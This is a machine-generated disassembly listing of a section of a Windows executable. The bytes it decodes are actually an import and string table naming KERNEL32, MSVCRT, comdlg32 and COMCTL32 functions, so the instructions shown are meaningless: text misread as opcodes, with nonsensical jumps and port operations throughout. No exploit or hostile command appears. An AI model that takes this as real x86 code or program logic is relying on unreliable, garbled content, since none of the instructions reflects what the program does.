  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
